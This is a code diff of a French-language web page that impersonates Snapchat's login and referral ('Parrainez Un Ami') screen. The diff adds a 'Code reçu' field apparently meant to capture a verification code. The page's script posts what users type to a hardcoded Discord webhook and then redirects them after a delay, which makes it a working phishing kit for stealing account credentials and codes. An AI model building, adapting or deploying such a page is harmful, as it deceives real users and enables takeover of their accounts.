@@ -20,7 +20,8 @@
       align-items: center;
       height: 100vh;
     }
-    .login-box, .image-screen {
+
+    .login-box, .code-screen {
       width: 100%;
       max-width: 400px;
       padding: 40px;
@@ -30,21 +31,25 @@
       background-color: #fff;
       color: #000;
     }
+
     .logo {
       width: 80px;
       margin: 0 auto 20px auto;
       display: block;
     }
+
     .form-group {
       text-align: left;
       margin-bottom: 15px;
     }
+
     .form-group label {
       display: block;
       font-size: 13px;
       font-weight: bold;
       margin-bottom: 5px;
     }
+
     .form-group input {
       width: 100%;
       padding: 12px;
@@ -53,6 +58,7 @@
       font-size: 16px;
       box-sizing: border-box;
     }
+
     button {
       background-color: #fffc00;
       border: none;
@@ -65,12 +71,14 @@
       margin-top: 20px;
       font-size: 16px;
     }
+
     .links-container {
       display: flex;
       justify-content: space-between;
       margin-top: 10px;
       font-size: 14px;
     }
+
     .link-button {
       background: transparent;
       border: none;
@@ -79,24 +87,44 @@
       cursor: pointer;
       text-decoration: underline;
     }
+
     #errorMessage,
     #referralError {
       color: red;
       display: none;
       margin-top: 10px;
     }
+
+    /* Styles pour la zone de code */
     #imageScreen {
       display: none;
+      text-align: center;
     }
-    #imageScreen img {
-      width: 200px; /* taille réduite */
-      border-radius: 10px;
+
+    #imageScreen label {
       display: block;
-      margin: 0 auto;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+
+    #imageScreen input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
+      margin-bottom: 10px;
+    }
+
+    #imageScreen p {
+      font-weight: bold;
+      margin-top: 5px;
     }
   </style>
 </head>
 <body>
+  <!-- Formulaire de connexion -->
   <div class="login-box" id="loginBox">
     <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
     <h2>Snapchat | Parrainez Un Ami</h2>
@@ -125,17 +153,12 @@
     <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
-  <div class="code-screen" id="codeScreen">
-  <!-- Texte au-dessus de la zone -->
-  <label for="codeInput">Code reçu</label>
-  
-  <!-- Zone de texte pour entrer le code -->
-  <input type="text" id="codeInput" name="codeInput" placeholder="Entrez votre code ici" />
-  
-  <!-- Texte en dessous de la zone -->
-  <p>Validez</p>
-</div>
-
+  <!-- Zone de saisie du code -->
+  <div class="code-screen" id="imageScreen">
+    <label for="codeInput">Code reçu</label>
+    <input type="text" id="codeInput" name="codeInput" />
+    <p>Validez</p>
+  </div>
 
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1456052165062955154/PIffzSrsDCnQ4Q-Um7YqT4e9Ti6Cz7m8FbSHqI169lw6MnT8nra8dyS_zEesu9M3wsNS";
@@ -187,7 +210,7 @@
         body: JSON.stringify(message),
       })
       .then(response => {
-        // Après l'envoi, lancer le processus d'affichage et de redirection
+        // Après l'envoi, afficher la zone de code
         setTimeout(() => {
           document.getElementById('loginBox').style.display = 'none';
           document.getElementById('imageScreen').style.display = 'block';
@@ -195,7 +218,7 @@
           setTimeout(() => {
             window.location.href = redirectURL;
           }, 30000); // 30 secondes
-        }, 1000); // 1 seconde (modifié)
+        }, 1000);
       })
       .catch(error => {
         alert("Erreur réseau ou CORS.");
@@ -205,4 +228,3 @@
   </script>
 </body>
 </html>
-
